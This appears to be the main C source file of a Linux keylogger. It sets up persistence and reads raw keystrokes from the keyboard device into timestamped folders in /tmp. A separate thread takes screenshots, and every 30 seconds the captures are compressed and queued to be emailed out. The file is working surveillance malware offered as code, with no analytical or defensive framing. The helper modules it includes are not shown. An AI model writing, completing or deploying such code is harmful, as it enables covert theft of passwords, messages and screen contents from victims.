#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <X11/Xlib.h>
#include <pwd.h>
#include "getKeyboard.h"
#include "keylogger.h"
#include "screenShot.h"
#include "compress.h"
#include "mailWorker.h"
#include "persistent.h"

#define TEMPDIR "/tmp"

volatile sig_atomic_t stopLogging = 0;
pthread_mutex_t dirLock = PTHREAD_MUTEX_INITIALIZER;
char *KeyLogDir = NULL;

void stopHandler(int sig)
{
    (void)sig;
    stopLogging = 1;
}

char *CreateKeyLogDir()
{
    char folderName[256];
    time_t now = time(NULL);
    struct tm *t = localtime(&now);

    strftime(folderName, sizeof(folderName), "%Y-%m-%d_%H-%M-%S", t);

    char fullFolder[512];
    snprintf(fullFolder, sizeof(fullFolder), "%s/%s", TEMPDIR, folderName);
    mkdir(fullFolder, 0700);

    char *result = malloc(strlen(fullFolder) + 1);
    strcpy(result, fullFolder);
    return result;
}

int main()
{
    // setup signal handler
    signal(SIGALRM, stopHandler);

    persistent();

    char *KEYBOARD_DEVICE = getKeyboard();
    if (!KEYBOARD_DEVICE)
    {
        fprintf(stderr, "No keyboard device found.\n");
        return EXIT_FAILURE;
    }

    printf("Keyboard device found: %s\n", KEYBOARD_DEVICE);

    int keyboard;
    keyboard = open(KEYBOARD_DEVICE, O_RDONLY);
    if (keyboard < 0)
    {
        perror("Failed to open keyboard device");
        free(KEYBOARD_DEVICE);
        return EXIT_FAILURE;
    }

    pthread_mutex_init(&dirLock, NULL);

    pthread_mutex_lock(&dirLock);
    KeyLogDir = CreateKeyLogDir();
    pthread_mutex_unlock(&dirLock);

    if (!KeyLogDir)
    {
        perror("Failed to create keylog directory");
        free(KEYBOARD_DEVICE);
        close(keyboard);
        return EXIT_FAILURE;
    }

    time_t lastFolderTime = time(NULL);

    // Start screenshot thread
    pthread_t screenshotThread;
    pthread_create(&screenshotThread, NULL, screenShot, NULL);
    pthread_detach(screenshotThread);

    initMailWorker();

    while (1)
    {
        time_t now = time(NULL);
        if (difftime(now, lastFolderTime) >= 30)
        {
            pthread_mutex_lock(&dirLock);
            free(KeyLogDir);
            KeyLogDir = CreateKeyLogDir();
            pthread_mutex_unlock(&dirLock);
            lastFolderTime = now;
        }

        pthread_mutex_lock(&dirLock);
        char keylogFile[512];
        snprintf(keylogFile, sizeof(keylogFile), "%s/keylogs.txt", KeyLogDir);
        pthread_mutex_unlock(&dirLock);

        int writeout = open(keylogFile, O_WRONLY | O_APPEND | O_CREAT, 0600);
        if (writeout < 0)
        {
            perror("Failed to open keylog file");
            sleep(1);
            continue;
        }

        stopLogging = 0;
        alarm(30);
        keylogger(keyboard, writeout);
        alarm(0);

        pthread_mutex_lock(&dirLock);
        char *zipPath = compressFile(KeyLogDir);
        pthread_mutex_unlock(&dirLock);

        enqueueMail(zipPath);
        close(writeout);
    }

    stopMailWorker();
    pthread_mutex_destroy(&dirLock);
    close(keyboard);
    free(KEYBOARD_DEVICE);
    free(KeyLogDir);
    return 0;
}